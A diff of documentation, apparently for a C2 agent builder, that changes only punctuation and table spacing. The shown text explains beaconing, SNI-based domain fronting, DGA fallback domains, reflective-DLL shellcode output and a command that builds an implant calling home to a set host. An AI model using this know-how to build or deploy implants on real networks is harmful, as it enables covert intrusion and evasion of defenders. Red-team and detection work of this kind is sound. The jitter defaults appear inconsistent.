@@ -27,8 +27,8 @@ cargo run --bin builder -- \
 | `--transport` | `tls` | Transport: `tls`, `tcp_plain`, `named_pipe`, `http`, `https` |
 | `--format` | `exe` | Output: `exe`, `dll`, `service`, `stager`, `shellcode` |
 | `--profile` | `default` | Built-in profile: `default`, `http_post`, `http_image` |
-| `--profile-file` | — | Path to custom malleable profile JSON |
-| `--fallback-file` | — | Path to fallback endpoints JSON |
+| `--profile-file` | - | Path to custom malleable profile JSON |
+| `--fallback-file` | - | Path to fallback endpoints JSON |
 | `--sleep` | `40` | Beacon interval in seconds |
 | `--jitter-min` | `20` | Minimum jitter percentage |
 | `--jitter-max` | `10` | Maximum jitter percentage |
@@ -41,7 +41,7 @@ cargo run --bin builder -- \
 | Flag | Default | Description |
 |------|---------|-------------|
 | `--sni <hostname>` | *(c2 host)* | SNI hostname advertised in TLS ClientHello. The TCP connection still goes to `--host`; set this to a CDN or cloud hostname to blend with legitimate TLS traffic. |
-| `--alpn <protos>` | `http/1.1` | Comma-separated ALPN protocol list, e.g. `h2,http/1.1`. Advertised in TLS ClientHello. Must match what the listener actually speaks — do not advertise `h2` unless the server supports HTTP/2. |
+| `--alpn <protos>` | `http/1.1` | Comma-separated ALPN protocol list, e.g. `h2,http/1.1`. Advertised in TLS ClientHello. Must match what the listener actually speaks - do not advertise `h2` unless the server supports HTTP/2. |
 
 These flags control the TLS ClientHello independently of the actual connection endpoint, enabling domain-fronting-style deployments where the SNI points to a CDN while traffic routes through the same infrastructure.
 
@@ -58,7 +58,7 @@ Hibernation agents do not maintain a long-lived connection, which avoids long-co
 
 | Flag | Default | Description |
 |------|---------|-------------|
-| `--dga-seed <u64>` | *(disabled)* | Enable DGA with this seed. When set, the agent generates additional C2 hostnames each time window and appends them as low-priority fallback endpoints. The operator must register the matching domains — computable from the same seed and window. |
+| `--dga-seed <u64>` | *(disabled)* | Enable DGA with this seed. When set, the agent generates additional C2 hostnames each time window and appends them as low-priority fallback endpoints. The operator must register the matching domains - computable from the same seed and window. |
 | `--dga-window <secs>` | `86400` | Time window length in seconds. The domain set rotates every window. Default is daily. |
 | `--dga-count <n>` | `16` | Number of domains to generate per window. |
 | `--dga-tlds <list>` | `com,net,org` | Comma-separated TLD list to sample from, e.g. `com,net,io`. |
@@ -92,14 +92,14 @@ shellcode using sRDI-style reflective loading:
 
 ```
 ┌─────────────────────┬──────────────────┬─────────────┬───────────┐
-│ bootstrap (69 bytes)│ RDI loader stub  │ raw DLL     │ user data │
+│ bootstrap (69 bytes)│ RDI loader stub │ raw DLL │ user data │
 └─────────────────────┴──────────────────┴─────────────┴───────────┘
 ```
 
 At runtime the bootstrap captures RIP, passes the DLL pointer / export hash /
 user-data pointer / flags to the embedded loader stub, which maps the DLL in
 memory (section copy, base relocations, import resolution via PEB walk + ROR13
-hashing) and calls `DllMain(DLL_PROCESS_ATTACH)` — where the RCM agent spawns
+hashing) and calls `DllMain(DLL_PROCESS_ATTACH)` - where the RCM agent spawns
 its thread. No export call is needed for RCM agents, hence the default hash
 `0x10` ("none").
 
@@ -107,7 +107,7 @@ The conversion is byte-for-byte compatible with [sRDI](https://github.com/monoxg
 (BSD 3-Clause, Copyright (c) 2013 Matthew Graeber); the embedded 64-bit loader
 stub is sRDI's precompiled `ShellcodeRDI` output. Execute the `.bin` with any
 shellcode loader (`VirtualAlloc` + `memcpy` + `CreateThread`, or your injector
-of choice — see `extensions/inject_*.rhai`).
+of choice - see `extensions/inject_*.rhai`).
 
 Shellcode-specific flags:
 
@@ -123,7 +123,7 @@ cargo run --bin builder -- \
   --host 10.0.0.1 --port 4443 \
   --platform windows --transport tls \
   --format shellcode --sc-output bin
-# → dist/shellcode_windows_<id>.bin
+# -> dist/shellcode_windows_<id>.bin
 ```
 
 ## Examples
@@ -148,7 +148,7 @@ cargo run --bin builder -- \
   --hibernation --batch-size 5 \
   --sleep 120
 # Pre-queue commands via API before the agent checks in:
-# POST /api/hosts/:id/queue  {"command": "whoami"}
+# POST /api/hosts/:id/queue {"command": "whoami"}
 ```
 
 Agent with DGA fallback (daily rotation, 32 domains/day):
